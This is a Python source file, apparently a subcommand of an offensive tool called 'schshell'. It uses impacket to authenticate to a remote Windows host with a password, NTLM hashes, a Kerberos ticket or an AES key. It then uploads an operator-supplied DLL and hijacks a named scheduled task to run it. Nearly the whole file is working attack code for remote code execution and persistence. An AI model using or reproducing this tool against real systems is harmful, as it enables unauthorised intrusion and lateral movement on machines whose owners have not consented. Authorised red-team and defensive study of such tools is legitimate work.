import typer
import logging
from schshell.lib.taskhandler import TaskHandler
from schshell import banner
from schshell.lib.models import Hijack
from impacket.examples.utils import parse_target
from pathlib import Path


app = typer.Typer()
COMMAND_NAME = 'hijack'
HELP = 'DLL hijack a scheduled task'

@app.callback(no_args_is_help=True, invoke_without_command=True)
def main(
    target:             str                     = typer.Argument(..., help='\[\[domain/]username[:password]@]<targetName or address>'),
    task:               Hijack                  = typer.Option(..., '-t', '--task', case_sensitive=False, help='Task to hijack'),
    dll:                typer.FileBinaryRead    = typer.Option(..., '-d', '--dll', help='Native DLL that will be uploaded to the target'),
    hashes:             str                     = typer.Option(None, '--hashes', metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH'),
    no_pass:            bool                    = typer.Option(False, '--no-pass', help='Don\'t ask for password (useful for -k)'),
    kerberos:           bool                    = typer.Option(False, '-k', '--kerberos', help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line'),
    aesKey:             str                     = typer.Option(None, '--aesKey', help='AES key to use for Kerberos Authentication (128 or 256 bits)'),
    domain_controller:  str                     = typer.Option('', '--dc-ip', help='Domain controller IP or hostname to query'),
    debug:              bool                    = typer.Option(False, '--debug', help='Turn DEBUG output ON')):

    if debug:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    banner()

    domain, username, password, host = parse_target(target)

    if password == '' and username != '' and hashes is None and no_pass is False and aesKey is None:
        from getpass import getpass
        password = getpass('Password:')

    lm_hash = ""
    nt_hash = ""
    if hashes is not None:
        if ":" in hashes:
            lm_hash = hashes.split(":")[0]
            nt_hash = hashes.split(":")[1]
        else:
            nt_hash = hashes
    
    if domain_controller == "":
        domain_controller = domain

    if aesKey is not None:
        kerberos = True    

    task_handler = TaskHandler(None, username, password, domain, host, lm_hash, nt_hash, aesKey, kerberos, domain_controller)
    task_handler.hijack_task(task, dll)
    task_handler.disconnect()